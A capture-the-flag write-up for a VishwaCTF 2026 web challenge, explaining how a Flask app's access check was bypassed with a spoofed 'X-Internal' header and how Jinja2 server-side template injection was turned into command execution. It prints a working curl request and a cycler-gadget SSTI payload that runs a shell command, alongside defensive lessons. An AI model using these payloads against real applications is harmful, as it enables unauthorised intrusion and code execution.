# Ghost in the Pipeline — VishwaCTF 2026

| Field | Value |
|-------|-------|
| Category | Web |
| Challenge | ghost_in_the_pipeline |
| URL | `https://ghost-p.vishwactf.com/` |
| Flag | `vishwaCTF{smuggl3d_pois0ned_templat3_escaped}` |

## TL;DR

Flask SSTI via internal report API. Bypass 403 with `X-Internal: true` header, inject Jinja2 template into cached report content, trigger rendering on dashboard to get RCE.

## Analysis

### Recon

Homepage reveals two hidden endpoints in HTML comments:
```html
<!-- TODO: remove before prod — report API at /api/report (POST) -->
<!-- cache refresh via ?report_id= param on dashboard -->
```

- `GET /dashboard?report_id=X` — displays cached report content
- `POST /api/report` — caches a report (returns 403 by default)

### Bypassing 403

Adding `X-Internal: true` header changes the 403 to a 200:
```bash
curl -X POST https://ghost-p.vishwactf.com/api/report \
  -H "Content-Type: application/json" \
  -H "X-Internal: true" \
  -d '{"report_id":"test","content":"hello"}'
# {"report_id":"test","status":"cached"}
```

### SSTI Discovery

The `content` field is rendered as a Jinja2 template when viewed on the dashboard:
```bash
# Cache: content = "{{7*7}}"
# View:  /dashboard?report_id=ssti1
# Output: 49
```

`{{config}}` leaks Flask config including `SECRET_KEY: sup3r_s3cr3t_n0va`.

## Exploit

```python
# Jinja2 SSTI -> RCE via cycler gadget
payload = '{{cycler.__init__.__globals__.os.popen("cat /flag.txt").read()}}'
```

1. POST payload as report content with `X-Internal: true`
2. GET `/dashboard?report_id=<id>` to trigger template rendering
3. Read `/flag.txt`

See [solve.py](solve.py)

## Key Lessons

- HTML comments in "staging" apps leak internal API endpoints
- `X-Internal` / `X-Forwarded-For` header-based access control is trivially bypassable
- Never render user-controlled data through a template engine — use `render_template_string` with caution or avoid it entirely
- CWE-1336: Server-Side Template Injection
